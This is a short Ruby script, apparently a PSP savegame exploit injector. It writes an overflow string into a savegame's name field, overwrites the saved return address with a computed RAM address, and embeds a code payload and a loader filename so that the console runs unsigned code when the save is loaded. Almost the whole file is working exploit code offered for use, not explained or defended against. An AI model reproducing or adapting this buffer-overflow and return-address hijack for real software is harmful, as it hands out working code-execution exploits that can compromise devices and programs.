#!/usr/bin/ruby

#Usage:
#requires code.bin and SOURCE_SDDATA.BIN in the same folder
#type "inject.rb" will inject code.bin into the unencrypted savegame and produce SDDATA.BIN

require 'FileUtils'

class String
  def hex_to_bin
    return gsub(/\s/,'').to_a.pack("H*")
  end
end

#######
# SETUP
#######
#you can change this value
code_pos = "0x8160".hex #Where to put the code in the file
file_pos = code_pos + "0x60".hex #Where to put the filename in the file (see loader.s if you change this value)
filename = "ms0:/h.bin"

#Don't change the code below this line unless you know what you do
overflow = "57 00 6F 00 6C 00 6F 00 6C 00" +  "6F 00 " * 25
ram_offset = "0x8d13780".hex # Magic number (pos in ram - pos in file of the code)
name_pos = "0x8120".hex #pos of beginning of the name in file

#######
# CODE
#######
ra = code_pos + ram_offset
ra_str = "0" + ra.to_s(16)
ra_bin = ra_str.to_a.pack("H*").reverse
overflow_bin = overflow.gsub(/\s/,'').to_a.pack("H*") + ra_bin



f = File.open('code.bin');
code = f.read;

File.open('SOURCE_SDDATA.BIN') do |f|
  x = f.read;
  0.upto(overflow_bin.length-1) do |i|
	x[name_pos+i] = overflow_bin[i]
  end
  0.upto(filename.length-1) do |i|
	x[file_pos+i]=filename[i];
  end
   0.upto(code.length-1) do |i|
	x[code_pos+i]=code[i];
  end 
  File.open('SDDATA.bin', File::CREAT | File::WRONLY | File::TRUNC) do |k| k.print x end
end